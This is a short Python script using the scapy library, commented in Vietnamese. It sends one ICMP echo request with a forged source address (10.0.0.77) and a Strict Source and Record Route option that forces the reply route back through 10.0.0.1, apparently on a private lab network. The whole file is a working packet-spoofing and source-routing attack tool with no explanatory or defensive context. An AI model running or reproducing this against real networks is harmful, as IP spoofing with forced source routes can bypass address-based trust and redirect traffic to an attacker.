#!/usr/bin/env python3
# ssrr.py - Giả mạo IP nguồn 10.0.0.77 kèm tùy chọn IP SSRR ép lộ trình đảo ngược về 10.0.0.1
from scapy.all import IP, IPOption_SSRR, ICMP, send
import sys

print("[*] Crafting ICMP Echo Request with IPOption_SSRR...")
pkt = IP(src="10.0.0.77", dst="10.0.0.2",
         options=[IPOption_SSRR(routers=["10.0.0.1", "10.0.0.2"])]) \
      / ICMP(id=0x4242) / b"src-routed-probe"

print(f"[*] Packet details: src={pkt[IP].src}, dst={pkt[IP].dst}, proto={pkt[IP].proto}")
print(f"[*] IP Options: {pkt[IP].options}")
send(pkt, verbose=1)
print("[+] Sent ICMP echo with SSRR option, SPOOFED source = 10.0.0.77")

